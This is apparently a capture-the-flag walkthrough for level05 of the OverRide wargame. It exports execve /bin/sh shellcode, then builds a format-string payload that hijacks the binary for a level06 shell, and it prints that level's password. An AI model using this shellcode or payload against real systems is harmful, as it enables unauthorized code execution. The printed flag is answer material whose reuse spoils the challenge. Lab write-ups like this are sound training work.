Being able to replicate this method can be harder than for the rest and more time consuming. To begin with export the shellcode:

```sh
level05@OverRide:~$ export SHELLCODE=$(python -c "print('\x90' * 50 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')")
```

Then find the address of the env variable using env_address.c that you have to compile with -m32 flag:

```sh
level05@OverRide:/tmp$ ./a.out SHELLCODE
Searching address of SHELLCODE env variable:
Big-endian format: 0xffffd8cf
Lil-endian format: \xcf\xd8\xff\xff
```

If the address of the env variable is exactly 0xffffd8cf (which should be, you can leave and join OverRide to clean the environment), then the rest will works, if the address changes, we will have to go through all the calculatons present in the README all over again. If the address is correct you then just have to execute these two commands to get a shell as level06:

```sh
level05@OverRide:~$ echo $(python -c "print('\xe0\x97\x04\x08' + 'AAAA' + '\xe2\x97\x04\x08' + '%8x' * 8 + '%55427x' + '%hn' + '%10032x' + '%hn')") > /tmp/payload
level05@OverRide:~$ cat /tmp/payload - | /home/users/level05/level05
[...]
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
